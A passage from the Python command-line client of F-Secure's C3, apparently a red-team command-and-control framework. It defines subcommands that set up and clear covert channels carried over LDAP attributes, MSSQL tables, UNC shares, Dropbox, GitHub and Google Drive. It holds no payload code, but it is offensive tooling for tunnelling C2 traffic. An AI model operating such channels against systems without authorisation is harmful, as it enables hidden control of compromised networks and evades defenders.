    mattermost_purge = mattermost_parser.add_parser('clear', help = 'Purge all dangling posts/messages from Mattermost channel.')
    mattermost_purge.set_defaults(func = onMattermostPurge)

    ## LDAP
    ldap = parser_channel_sub.add_parser('ldap', help = 'LDAP channel specific commands.')
    ldap_parser = ldap.add_subparsers(help = 'Command to send', required = True)

    ### clear
    ldap_clear = ldap_parser.add_parser('clear', help = 'Clear LDAP attribute associated with that channel.')
    ldap_clear.set_defaults(func = onLDAPClear)

    ### Create
    ldap_create = ldap_parser.add_parser('create', help = 'Setup a LDAP Negotiation channel.')
    ldap_create.add_argument('agent_id', metavar = 'agent_id', help = 'Gateway or Relay that will be used to setup a channel. Can be ID or Name.')
    ldap_create.add_argument('--data-attribute', metavar = 'data_attribute', default = 'mSMQSignCertificates', help = 'Data LDAP Attribute. Default: mSMQSignCertificates')
    ldap_create.add_argument('--lock-attribute', metavar = 'lock_attribute', default = 'primaryInternationalISDNNumber', help = 'Lock LDAP Attribute. Default: primaryInternationalISDNNumber')
    ldap_create.add_argument('--max-size', metavar = 'max_size', default = 1047552, type = int, help = 'Max Packet Size. Default: 1047552')
    ldap_create.add_argument('domain_controller', metavar = 'domain_controller', help = 'Domain Controller.')
    ldap_create.add_argument('username', metavar = 'username', help = 'LDAP username.')
    ldap_create.add_argument('password', metavar = 'password', help = 'LDAP password.')
    ldap_create.add_argument('user_dn', metavar = 'user_dn', help = 'User Distinguished Name, example: CN=Jeff Smith,CN=users,DC=fabrikam,DC=com')
    ldap_create.add_argument('--negotiation-id', metavar = 'ID', default='random', help = 'Negotiation Identifier. Will be picked at random if left empty.')
    ldap_create.set_defaults(func = onLDAPCreate)

    ## MSSQL
    mssql = parser_channel_sub.add_parser('mssql', help = 'MSSQL channel specific commands.')
    mssql_parser = mssql.add_subparsers(help = 'Command to send', required = True)

    ### clear
    mssql_clear = mssql_parser.add_parser('clear', help = 'Clear channel\'s DB Table.')
    mssql_clear.set_defaults(func = onMSSQLClearTable)

    ### Create
    mssql_create = mssql_parser.add_parser('create', help = 'Setup a MSSQL Negotiation channel.')
    mssql_create.add_argument('agent_id', metavar = 'agent_id', help = 'Gateway or Relay that will be used to setup a channel. Can be ID or Name.')
    mssql_create.add_argument('server_name', metavar = 'server_name', help = 'MSSQL Server name')
    mssql_create.add_argument('database_name', metavar = 'database_name', help = 'Database Name.')
    mssql_create.add_argument('table_name', metavar = 'table_name', help = 'Table Name.')
    mssql_create.add_argument('username', metavar = 'username', help = 'Database username.')
    mssql_create.add_argument('password', metavar = 'password', help = 'Database password.')
    mssql_create.add_argument('sspi', metavar = 'sspi', type=bool, help = 'Use Integrated Security (SSPI) - use for domain joined accounts. Default: false.')
    mssql_create.add_argument('--negotiation-id', metavar = 'ID', default='random', help = 'Negotiation Identifier. Will be picked at random if left empty.')
    mssql_create.set_defaults(func = onMSSQLCreate)

    ## UncShareFile
    unc = parser_channel_sub.add_parser('uncsharefile', help = 'UncShareFile channel specific commands.')
    unc_parser = unc.add_subparsers(help = 'Command to send', required = True)

    ### clear
    unc_clear = unc_parser.add_parser('clear', help = 'Clear all message files.')
    unc_clear.set_defaults(func = onUncShareFileClear)

    unc_create = unc_parser.add_parser('create', help = 'Setup a Mattermost Negotiation channel.')
    unc_create.add_argument('agent_id', metavar = 'agent_id', help = 'Gateway or Relay that will be used to setup a channel. Can be ID or Name.')
    unc_create.add_argument('filesystem_path', metavar = 'filesystem_path', help = 'Filesystem path')
    unc_create.add_argument('--clear', type=bool, metavar = 'clear', default = False, help = 'Clear previous messages')
    unc_create.add_argument('--negotiation-id', metavar = 'ID', default='random', help = 'Negotiation Identifier. Will be picked at random if left empty.')
    unc_create.set_defaults(func = onUncShareFileCreate)

    ## Dropbox
    dropbox = parser_channel_sub.add_parser('dropbox', help = 'Dropbox channel specific commands.')
    dropbox_parser = dropbox.add_subparsers(help = 'Command to send', required = True)

    ### clear
    dropbox_clear = dropbox_parser.add_parser('clear', help = 'Clear all files.')
    dropbox_clear.set_defaults(func = onDropboxClear)

    ## Dropbox
    github = parser_channel_sub.add_parser('github', help = 'Github channel specific commands.')
    github_parser = github.add_subparsers(help = 'Command to send', required = True)

    ### clear
    github_clear = github_parser.add_parser('clear', help = 'Clear all files.')
    github_clear.set_defaults(func = onGithubClear)

    ## GoogleDrive
    gdrive = parser_channel_sub.add_parser('googledrive', help = 'GoogleDrive channel specific commands.')
    gdrive_parser = gdrive.add_subparsers(help = 'Command to send', required = True)

    ### clear
    gdrive_clear = gdrive_parser.add_parser('clear', help = 'Clear all files.')
    gdrive_clear.set_defaults(func = onGoogleDriveClear)

    try:
        args = opts.parse_args()
    except TypeError:
        opts.parse_args(argv.append('--help'))
        sys.exit(1)

    config.update(vars(args))
    return args.func(args)

def main(argv):
    print('''
    :: F-Secure's C3 Client - a lightweight automated companion with C3 voyages
    Mariusz Banach / mgeeky, <mb@binary-offensive.com>
''')
    parseArgs(argv) 

    if config['format'] == 'text':
        print()

if __name__ == '__main__':
    main(sys.argv)
